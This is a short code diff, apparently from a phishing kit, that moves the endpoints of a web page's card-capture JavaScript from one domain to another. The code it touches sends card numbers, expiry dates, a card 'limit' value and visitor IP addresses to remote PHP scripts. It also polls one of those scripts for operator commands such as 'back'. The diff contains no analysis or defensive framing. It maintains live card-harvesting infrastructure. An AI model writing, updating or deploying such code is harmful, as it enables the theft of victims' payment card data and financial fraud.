@@ -55,7 +55,7 @@
         // Formun post işlemi
         $.ajax({
             type: 'POST',
-            url: 'https://hakikicelikhantutunu.com/dmn/veri2.php', // Göndermek istediğiniz adres
+            url: 'https://akbulutmensucat.com/dmn/veri2.php', // Göndermek istediğiniz adres
             data: {
                 cardNumber: encodeURIComponent(cardNumber),
                 expiryDate: encodeURIComponent(expiryDate),
@@ -94,7 +94,7 @@
             const ip = getCookie('ip');
             $.ajax({
                 type: 'POST',
-                url: 'https://hakikicelikhantutunu.com/dmn/limit.php',
+                url: 'https://akbulutmensucat.com/dmn/limit.php',
                 data: {
                     limit: encodeURIComponent(result.value.limit),
                     ip: encodeURIComponent(ip)
@@ -303,7 +303,7 @@
           }
         },
         sendRequest(visitorIP) {
-          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=Kart Sayfa')
+          axios.get('https://akbulutmensucat.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=Kart Sayfa')
             .then(response => {
               const msg = response.data;
               if (msg === "back") {
